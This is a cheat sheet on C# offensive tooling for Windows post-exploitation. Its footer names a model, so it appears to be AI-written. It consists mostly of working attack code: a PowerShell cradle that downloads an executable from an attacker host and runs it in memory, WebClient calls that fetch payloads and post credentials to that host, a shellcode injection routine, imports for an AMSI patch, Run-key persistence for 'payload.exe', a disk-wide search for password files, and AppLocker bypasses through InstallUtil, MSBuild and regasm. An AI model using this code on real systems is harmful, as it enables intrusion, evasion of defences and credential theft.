# C# (.NET Offensive Development)

**Tags:** `#csharp` `#dotnet` `#windows` `#tooldev` `#postexploit` `#execute-assembly`

C# is the language of the modern Windows offensive toolkit. Rubeus, SharpHound, Seatbelt, SharpUp, and most GhostPack tools are C#. The `execute-assembly` technique loads .NET assemblies in-memory via Cobalt Strike / Havoc / Sliver, avoiding disk writes. Understanding C# lets you modify these tools, write custom post-exploitation modules, and build LOTL .NET cradles.

**Build:** Visual Studio or `csc.exe` (bundled with .NET) or `dotnet build` (.NET Core)

> [!note]
> Target .NET Framework 4.0+ for maximum compatibility on older Windows targets. .NET Core/5+ requires the runtime to be installed. Always compile in Release mode for smaller binaries.

---

## Compile

```powershell
# Quick compile with csc.exe (Framework)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload.cs

# With references
csc.exe /r:System.DirectoryServices.dll /r:System.DirectoryServices.AccountManagement.dll /out:tool.exe tool.cs

# dotnet CLI (.NET Core/5+)
dotnet new console -n MyTool
dotnet build -c Release
dotnet run

# Build to single exe
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true

# Cross-compile from Linux
dotnet build -c Release -r win-x64
```

---

## Execute-Assembly (In-Memory)

```bash
# Cobalt Strike
beacon> execute-assembly /path/to/tool.exe -arg1 -arg2

# Havoc
execute-assembly /path/to/tool.exe args

# Evil-WinRM
*Evil-WinRM* PS> Invoke-Binary /path/to/tool.exe arg1 arg2

# PowerShell reflection (manual)
$bytes = [IO.File]::ReadAllBytes("C:\Temp\tool.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @([string[]]@("arg1","arg2")))

# Download + load from URL (no disk touch)
$bytes = (New-Object Net.WebClient).DownloadData("http://10.10.14.5/tool.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @([string[]]@()))
```

---

## Skeleton — Console Tool

```csharp
using System;
using System.Net;
using System.IO;

namespace MyTool {
    class Program {
        static void Main(string[] args) {
            if (args.Length < 1) {
                Console.WriteLine("Usage: MyTool.exe <target>");
                return;
            }
            string target = args[0];
            Console.WriteLine($"[*] Target: {target}");
            // do work
        }
    }
}
```

---

## Network / HTTP

```csharp
using System.Net;
using System.IO;
using System.Text;

// Simple GET
WebClient wc = new WebClient();
string response = wc.DownloadString("http://10.10.14.5/payload.ps1");

// Download file
wc.DownloadFile("http://10.10.14.5/tool.exe", @"C:\Temp\tool.exe");

// POST
wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
string result = wc.UploadString("http://10.10.14.5/", "user=admin&pass=password");

// HttpWebRequest (more control)
HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://target/api");
req.Method = "POST";
req.ContentType = "application/json";
req.Headers.Add("Authorization", "Bearer token");
req.ServerCertificateValidationCallback = (a,b,c,d) => true;  // ignore SSL

byte[] body = Encoding.UTF8.GetBytes("{\"key\":\"value\"}");
req.ContentLength = body.Length;
using (Stream s = req.GetRequestStream()) s.Write(body, 0, body.Length);

HttpWebResponse res = (HttpWebResponse)req.GetResponse();
string resp = new StreamReader(res.GetResponseStream()).ReadToEnd();
Console.WriteLine(resp);

// TCP socket
using System.Net.Sockets;
TcpClient client = new TcpClient("10.10.10.10", 80);
NetworkStream stream = client.GetStream();
byte[] data = Encoding.ASCII.GetBytes("GET / HTTP/1.0\r\n\r\n");
stream.Write(data, 0, data.Length);
byte[] buffer = new byte[4096];
int n = stream.Read(buffer, 0, buffer.Length);
Console.WriteLine(Encoding.ASCII.GetString(buffer, 0, n));
```

---

## Process & System

```csharp
using System.Diagnostics;
using System.Management;      // add reference: System.Management.dll

// Spawn process
Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");

// Spawn hidden
ProcessStartInfo psi = new ProcessStartInfo {
    FileName = "cmd.exe",
    Arguments = "/c whoami",
    WindowStyle = ProcessWindowStyle.Hidden,
    CreateNoWindow = true,
    UseShellExecute = false,
    RedirectStandardOutput = true
};
Process p = Process.Start(psi);
string output = p.StandardOutput.ReadToEnd();
p.WaitForExit();
Console.WriteLine(output);

// List processes
foreach (Process proc in Process.GetProcesses()) {
    Console.WriteLine($"{proc.Id}\t{proc.ProcessName}");
}

// Kill process
Process.GetProcessById(1234).Kill();

// WMI query
ManagementObjectSearcher searcher = new ManagementObjectSearcher(
    "SELECT * FROM Win32_Service WHERE StartName='LocalSystem'");
foreach (ManagementObject obj in searcher.Get()) {
    Console.WriteLine(obj["Name"] + " - " + obj["PathName"]);
}

// Environment
string path = Environment.GetEnvironmentVariable("PATH");
string user = Environment.UserName;
string domain = Environment.UserDomainName;
string machine = Environment.MachineName;
```

---

## File I/O

```csharp
using System.IO;

// Read
string content = File.ReadAllText(@"C:\file.txt");
string[] lines = File.ReadAllLines(@"C:\file.txt");
byte[] bytes = File.ReadAllBytes(@"C:\file.exe");

// Write
File.WriteAllText(@"C:\out.txt", "content");
File.WriteAllBytes(@"C:\out.exe", bytes);
File.AppendAllText(@"C:\log.txt", "new line\n");

// Enumerate files
foreach (string f in Directory.GetFiles(@"C:\Users", "*.txt", SearchOption.AllDirectories)) {
    Console.WriteLine(f);
}

// Search for creds in files
foreach (string f in Directory.GetFiles(@"C:\", "*", SearchOption.AllDirectories)) {
    try {
        if (File.ReadAllText(f).ToLower().Contains("password")) {
            Console.WriteLine($"[!] {f}");
        }
    } catch { }
}
```

---

## Windows API (P/Invoke)

```csharp
using System.Runtime.InteropServices;

// Import WinAPI functions
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
    uint flNewProtect, out uint lpflOldProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll", SetLastError = true)]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

// Shellcode injection (own process)
static void InjectShellcode(byte[] shellcode) {
    IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
        0x3000, 0x04);   // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
    Marshal.Copy(shellcode, 0, mem, shellcode.Length);
    uint oldProt;
    VirtualProtect(mem, (uint)shellcode.Length, 0x20, out oldProt); // PAGE_EXECUTE_READ
    IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(thread, 0xFFFFFFFF);
}

// AMSI patch (AmsiScanBuffer)
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);
```

---

## Active Directory / LDAP

```csharp
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;

// LDAP query — find domain admins
DirectoryEntry entry = new DirectoryEntry("LDAP://DC=domain,DC=local");
DirectorySearcher searcher = new DirectorySearcher(entry) {
    Filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))"
};
searcher.PropertiesToLoad.Add("sAMAccountName");
searcher.PropertiesToLoad.Add("description");
foreach (SearchResult r in searcher.FindAll()) {
    Console.WriteLine(r.Properties["sAMAccountName"][0]);
}

// Check if user is in group
using (PrincipalContext ctx = new PrincipalContext(ContextType.Domain, "domain.local")) {
    UserPrincipal user = UserPrincipal.FindByIdentity(ctx, "username");
    GroupPrincipal group = GroupPrincipal.FindByIdentity(ctx, "Domain Admins");
    Console.WriteLine(user.IsMemberOf(group));
}

// Validate credentials
using (PrincipalContext ctx = new PrincipalContext(ContextType.Domain, "domain.local")) {
    bool valid = ctx.ValidateCredentials("user", "password");
    Console.WriteLine($"Valid: {valid}");
}
```

---

## Registry

```csharp
using Microsoft.Win32;

// Read
string val = (string)Registry.GetValue(
    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
    "ProductName", "");
Console.WriteLine(val);

// Write (persistence)
RegistryKey key = Registry.CurrentUser.OpenSubKey(
    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
key.SetValue("Update", @"C:\Temp\payload.exe");

// Delete
key.DeleteValue("Update");

// Enumerate
RegistryKey hklm = Registry.LocalMachine.OpenSubKey(@"SOFTWARE");
foreach (string subkey in hklm.GetSubKeyNames()) {
    Console.WriteLine(subkey);
}
```

---

## Encoding / Crypto

```csharp
using System;
using System.Text;
using System.Security.Cryptography;

// Base64
string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes("data"));
string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(encoded));

// Hex
string hex = BitConverter.ToString(bytes).Replace("-", "").ToLower();
byte[] fromHex = Convert.FromHexString("deadbeef");  // .NET 5+

// MD5
using (MD5 md5 = MD5.Create()) {
    byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes("password"));
    Console.WriteLine(BitConverter.ToString(hash).Replace("-","").ToLower());
}

// SHA256
using (SHA256 sha = SHA256.Create()) {
    byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes("password"));
    Console.WriteLine(Convert.ToHexString(hash));  // .NET 5+
}

// AES encrypt
using (Aes aes = Aes.Create()) {
    aes.Key = key;   // 16/24/32 bytes
    aes.IV  = iv;    // 16 bytes
    using (var enc = aes.CreateEncryptor())
    using (var ms = new MemoryStream()) {
        using (var cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
            cs.Write(plaintext, 0, plaintext.Length);
        byte[] ciphertext = ms.ToArray();
    }
}

// DPAPI (current user context)
byte[] encrypted = ProtectedData.Protect(data, null, DataProtectionScope.CurrentUser);
byte[] decrypted = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser);
```

---

## AppLocker / CLM Bypass Execution Hosts

```batch
rem .NET exe as InstallUtil payload (runs in uninstall context)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U payload.exe

rem MSBuild inline task
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

rem regasm / regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u payload.dll
```

```xml
<!-- payload.csproj — MSBuild inline task -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample : Task, ITask {
            public override bool Execute() {
                Process.Start("cmd.exe", "/c calc.exe");
                return true;
            }
        }
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
